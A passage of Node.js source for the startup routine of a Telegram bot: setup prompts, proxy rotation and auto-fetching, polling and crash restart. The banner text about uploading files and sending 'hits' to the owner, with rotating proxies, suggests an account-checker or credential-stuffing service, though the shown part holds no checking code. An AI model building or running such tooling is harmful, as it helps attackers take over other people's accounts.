            const botInfo = await config.validateToken(token);
            if (botInfo) {
              console.log(`\x1b[92m✅ Token valid! Bot: ${botInfo.first_name} (@${botInfo.username})\x1b[0m\n`);
              resolve(token);
            } else {
              console.log('\x1b[91m❌ Invalid token or Telegram unreachable. Try again.\x1b[0m\n');
              askToken();
            }
          });
        }
        askToken();
      });

      // Get owner ID
      OWNER_ID = await new Promise(resolve => {
        console.log('\x1b[93mℹ️  To find your Telegram ID, message @userinfobot on Telegram.\x1b[0m');
        rl.question('\n\x1b[1;37m🔍 Enter your Telegram numeric ID (numbers only):\x1b[0m\n> ', (idStr) => {
          const id = parseInt(idStr.trim());
          if (isNaN(id)) {
            console.log('\x1b[91m❌ Must be a number. Using 0 — set it later.\x1b[0m');
            resolve(0);
          } else {
            resolve(id);
          }
        });
      });

      // Get owner username (optional)
      const ownerUsername = await new Promise(resolve => {
        rl.question('\n\x1b[1;37m👤 Enter your Telegram username WITHOUT @ (or press Enter to skip):\x1b[0m\n> ', (uname) => {
          resolve(uname.trim().replace(/^@+/, ''));
        });
      });

      rl.close();

      const setupCfg = {
        bot_token: BOT_TOKEN,
        owner_id: OWNER_ID,
        owner_username: ownerUsername,
      };
      config.saveConfig(setupCfg);
      console.log('\n\x1b[1;92m🚀 Setup complete! Starting bot...\x1b[0m\n');
    }
  }

  // ── Signal handling ─────────────────────────────────────────────────
  function gracefulShutdown(signum) {
    console.warn(`[MAIN] Received signal ${signum} — shutting down gracefully...`);
    config.shutdownEvent.set();
    for (const evt of Object.values(stopEvents)) {
      evt.set();
    }
  }
  process.on('SIGTERM', gracefulShutdown);
  process.on('SIGINT', gracefulShutdown);

  // ── Restore proxies from persistent storage ─────────────────────────
  await restoreAllProxies();
  geoRotator.reload(); // reload after restore

  // ── Log proxy status ────────────────────────────────────────────────
  const proxyFileNames = config.getProxyFiles().map(p => path.basename(p));
  console.log(
    `[GEO] Proxy rotator active -> ${geoRotator.currentProxy} ` +
    `(${geoRotator.total} proxies) | Files: ${proxyFileNames.join(', ') || 'none found'}`
  );

  // ── Load saved users ────────────────────────────────────────────────
  loadSavedUsers();

  // ── Start healthcheck server ────────────────────────────────────────
  const port = process.env.PORT;
  if (port) startHealthcheckServer(parseInt(port));

  // ── Start auto-fetch proxy background worker ────────────────────────
  const stopProxyFetcher = startProxyFetcher(geoRotator, {
    onProxiesAvailable: () => {
      resumeProxyPausedUsers(BOT_TOKEN);
    },
    touchLiveness: touchLiveness,
    persistProxies: persistProxies,
  });

  // ── Start Telegram bot ──────────────────────────────────────────────
  cleanupStaleFiles();
  startBotPolling(BOT_TOKEN);
  tgSetCommands(BOT_TOKEN);

  // ── Start watchdog & heartbeat ──────────────────────────────────────
  startMemoryWatchdog();
  startRailwayHeartbeat();

  console.log('🤖 Bot is running!');
  console.log('Flow: /start → level → hit type → upload file → progress bar → hits sent to your ID');
  console.log('New commands: /keysystem, /add_coowner, /remove_coowner, /resetconfig, /stopall');
  console.log('Auto-fetch proxy: ON (30s interval from ' + RAW_PROXY_SOURCES_COUNT + ' source(s))');
  console.log('Press Ctrl+C to stop.\n');

  // Keep main thread alive
  while (!config.shutdownEvent.isSet()) {
    await new Promise(r => setTimeout(r, 1000));
  }
}

const RAW_PROXY_SOURCES_COUNT = 1; // for the banner message

// ── Auto-restart on crash ──────────────────────────────────────────────
(async () => {
  while (true) {
    try {
      config.shutdownEvent.clear();
      await main();
      break;
    } catch (e) {
      if (e.message?.includes('SIGINT') || e.message?.includes('SIGTERM')) break;
      console.error(`✘ Unexpected error: ${e.message} — restarting in 5s...`);
      await new Promise(r => setTimeout(r, 5000));
    }
  }
})();
